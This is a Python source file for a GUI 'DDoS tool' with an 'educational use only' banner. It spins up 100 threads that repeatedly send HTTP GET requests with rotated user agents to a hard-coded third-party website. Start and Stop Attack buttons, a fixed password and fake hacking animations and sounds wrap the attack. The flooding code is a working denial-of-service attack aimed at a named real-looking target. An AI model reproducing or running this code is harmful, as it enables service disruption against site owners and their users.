import requests
import threading
import random
import time
import os
from tkinter import Tk, Label, StringVar, Button, Canvas, Frame, Entry
from tkinter import PhotoImage, Toplevel
from tkinter.messagebox import showinfo
from playsound import playsound
from PIL import Image, ImageTk
import pygame
import sys


# ASCII Banner
def display_banner():
    banner = r"""
********************************************
*    ILLUSIVE Ddos Tool - For Educational  *
*                 Use Only 
*    Made with Love by IllusiveHacks        *
**********************************************************************************
   _____   ___      ___     ___   ___    ______   _____  __         __  _______  *
* |_   _|  | |      | |     | |   | |   / ____|  |_   _| \ \       / /  |  ____|    
*   | |    | |      | |     | |   | |   | (___     | |    \ \     / /   |  |___  *  
    | |    | |      | |     | |   | |    \___ \    | |     \ \   / /    |  ____|
*  _| |_   | |___   | |___  | |___| |    ____) |  _| |_     \ \_/ /     |  |___  *
* |_____|  |_____|  |_____| |_______|   |_____/  |_____|     \___/      |______| *
**********************************************************************************
"""

    print(banner)


# GUI Setup
class StressTestGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Illusive Ddos Test Tool")
        self.root.geometry("700x500")
        self.root.resizable(False, False)

        # Load the background image
        self.background_image = PhotoImage(file="71316.png")  # Ensure the image file is available in the directory
        self.background_label = Label(self.root, image=self.background_image)
        self.background_label.place(relwidth=1, relheight=1)  # Make it cover the entire window

        self.status = StringVar()
        self.status.set("Welcome! Click Start to begin.")

        # Create a frame to hold the status label and canvas
        self.main_frame = Frame(self.root, bg="black")
        self.main_frame.pack(fill="both", expand=True)

        # Status label above the canvas
        self.status_label = Label(self.main_frame, textvariable=self.status, font=("Helvetica", 12), wraplength=550, fg="white", bg="black")
        self.status_label.pack(pady=20)

        # Create a canvas for the background (scrolling code)
        self.canvas = Canvas(self.main_frame, width=600, height=200, bd=0, highlightthickness=0, bg='black')  # Set background to black
        self.canvas.pack(fill="both", expand=True)

        # Add random code text to simulate a moving background
        self.code_lines = ["Initializing hacking sequence...", "Bypassing security protocols...", "Connecting to remote server...", "Running exploit..."]
        self.code_texts = []
        self.create_code_lines()

        # Load and resize the GIF image to reduce its size
        self.gif_image = Image.open("hack-hacker.gif")
        self.gif_image = self.gif_image.resize((200, 200), Image.Resampling.LANCZOS)  # Resize the GIF to fit better
        self.gif_image = ImageTk.PhotoImage(self.gif_image)  # Convert to Tkinter compatible format
        self.gif_label = Label(self.main_frame, image=self.gif_image, bg="black")
        
        # Fix the GIF to the right side
        self.gif_label.place(x=470, y=100)  # Adjust 'x' and 'y' to position the GIF where you want

        # Start the scrolling of the code
        self.scroll_code()

        # Event to stop the test
        self.stop_event = threading.Event()

        # Create buttons frame at the bottom
        self.button_frame = Frame(self.root, bg="black")
        self.button_frame.pack(fill="x", side="bottom", pady=10)

        # Create start and stop buttons inside the frame
        self.start_button = Button(self.button_frame, text="Start Attack", command=self.start_test, bg="green", fg="white", font=("Helvetica", 12), relief="raised", bd=3)
        self.start_button.pack(side="left", padx=10, pady=10)

        self.stop_button = Button(self.button_frame, text="Stop Attack", command=self.stop_test, bg="red", fg="white", font=("Helvetica", 12), relief="raised", bd=3)
        self.stop_button.pack(side="right", padx=10, pady=10)

    def create_code_lines(self):
        # Create the initial set of code lines that will scroll
        y_position = 20
        for line in self.code_lines:
            text = self.canvas.create_text(10, y_position, anchor="nw", text=line, fill="lime", font=("Courier", 12))
            self.code_texts.append(text)
            y_position += 20

    def start_test(self):
        self.authenticate_user()

    def authenticate_user(self):
        # Password prompt for authentication
        password_prompt = Toplevel(self.root)
        password_prompt.title("Authentication")
        password_prompt.geometry("300x150")

        password_label = Label(password_prompt, text="Enter Password:", font=("Helvetica", 12))
        password_label.pack(pady=20)

        password_entry = Entry(password_prompt, show="*", font=("Helvetica", 12))
        password_entry.pack()

        def verify_password():
            if password_entry.get() == "illusivehacks1":
                password_prompt.destroy()
                self.status.set("Starting Ddos Attack... Please wait.")
                self.play_hacking_sound()
                self.stop_event.clear()
                threading.Thread(target=main, args=(self.update_status, self.stop_event), daemon=True).start()
            else:
                showinfo("Error", "Incorrect password. Try again.")

        password_button = Button(password_prompt, text="Authenticate", command=verify_password, bg="green", fg="white")
        password_button.pack(pady=10)

    def play_hacking_sound(self):
        # Initialize pygame mixer
        pygame.mixer.init()
        pygame.mixer.music.load("recording.wav")  # Ensure the sound file exists in the directory
        pygame.mixer.music.play()

    def stop_test(self):
        self.status.set("Attack Stopped.")
        self.stop_event.set()  # Set the stop event to stop the test

    def update_status(self, message):
        self.status.set(message)

    def scroll_code(self):
        # Move the code text upwards
        for text in self.code_texts:
            self.canvas.move(text, 0, -2)

        # Loop the code: move the top line to the bottom after reaching the top
        if self.canvas.bbox(self.code_texts[0])[1] < 0:  # If the top text is off-screen
            self.canvas.move(self.code_texts[0], 0, len(self.code_lines) * 20)  # Move it to the bottom
            self.code_texts.append(self.code_texts.pop(0))  # Move the text to the end of the list

        self.canvas.after(100, self.scroll_code)  # Keep scrolling


# Target URL
target_url = "https://massalah-mvp.netlify.app/home.html"     #

# Number of threads to use for flooding
num_threads = 100

# List of user agents for request headers
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
]

# Function to send requests using random user agents
def send_request(update_status, stop_event, stats):
    success_count = 0
    failure_count = 0
    while not stop_event.is_set():  # Check if the stop event is set
        try:
            # Choose a random user agent
            user_agent = random.choice(user_agents)
            headers = {"User-Agent": user_agent}

            # Send request
            response = requests.get(target_url, headers=headers, timeout=5)
            stats["requests_sent"] += 1
            if response.status_code == 200:
                success_count += 1
            else:
                failure_count += 1
            update_status(f"Request Sent | Success: {success_count} | Failures: {failure_count}")
        except requests.exceptions.RequestException as e:
            stats["requests_sent"] += 1
            failure_count += 1
            update_status(f"Error: {e}")

# Main function
def main(update_status, stop_event):
    display_banner()

    stats = {
        "requests_sent": 0,
        "success_count": 0,
        "failure_count": 0,
    }

    # Start multiple threads
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_request, args=(update_status, stop_event, stats), daemon=True)
        thread.start()
        threads.append(thread)

    # Keep the main thread alive while the attack runs
    for thread in threads:
        thread.join()


# Initialize GUI
if __name__ == "__main__":
    root = Tk()
    app = StressTestGUI(root)
    root.mainloop()
